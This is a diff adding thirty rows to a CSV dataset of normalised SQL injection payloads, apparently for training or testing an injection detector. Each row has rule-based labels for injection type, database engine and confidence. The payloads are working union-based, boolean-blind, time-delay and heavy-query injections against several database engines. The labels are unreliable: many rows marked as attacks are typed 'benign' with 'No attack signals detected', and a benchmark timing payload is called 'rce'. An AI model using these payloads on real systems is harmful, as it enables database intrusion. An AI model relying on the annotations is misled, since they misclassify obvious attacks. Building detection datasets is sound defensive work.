@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+6030,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ""sfnj"" like ""sfnj",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
+6031,-3105' or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and 'srep' = 'srep,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6032,-4339 ) where 7178 = 7178 or 4008 = 7232,1,,boolean_blind,generic,0.95,7178 = 7178 or detected — boolean_blind injection (priority 8) on generic,rule-based
+6033,"1"" ) ) as irrz where 8730 = 8730 order by 1#",1,,boolean_blind,generic,0.95,8730 = 8730 or detected — boolean_blind injection (priority 8) on generic,rule-based
+6034,"-1106' ) ) union all select 2855,2855,2855,2855,2855,2855,2855#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6035,"1"" ) as cysq where 5258 = 5258",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6036,"waitfor delay '0:0:5' and ( ( ""zili"" like ""zili",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6037,"-4639"" ) ) ) or 8550 = 9348",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6038,"1%' ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( '%' = '",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
+6039,1 ) as fhvr where 5544 = 5544,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6040,"1"" and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
+6041,select case when 1238 = 9044 then 1 else null end--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6042,"1"" or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ""ljkg"" = ""ljkg",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6043,"1, ( select ( case when ( 8596 = 8596 ) then 1 else 8596* ( select 8596 from mysql.db ) end ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6044,"1%"" union all select null,null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6045,1 ) ) and 9198 = 9198--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6046,1' in boolean mode ) waitfor delay '0:0:5'--,1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6047,"1%"" ) ) ) union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6048,"-8888%' ) union all select 5312,5312,5312,5312,5312,5312,5312,5312--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+6049,"1 where 7412 = 7412 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
+6050,-7230' ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( 'khtc' = 'khtc,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+6051,"1"" ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( ""dnlz"" = ""dnlz",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+6052,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'stea' = 'stea,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+6053,"1"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6054,"1 ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
+6055,select ( case when ( 7385 = 8723 ) then 7385 else 7385* ( select 7385 from information_schema.character_sets ) end ) #,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6056,1 ) ) as ogcv where 4396 = 4396,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+6057,"1%' ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( '%' = '",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
+6058,"1 ) as ocut where 6800 = 6800 and elt ( 4249 = 4249,7259 ) --",1,,boolean_blind,generic,0.95,6800 = 6800 and detected — boolean_blind injection (priority 8) on generic,rule-based
+6059,1' ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( 'mizk' = 'mizk,1,,boolean_blind,generic,0.95,") and (, rlike  detected — boolean_blind injection (priority 8) on generic",rule-based
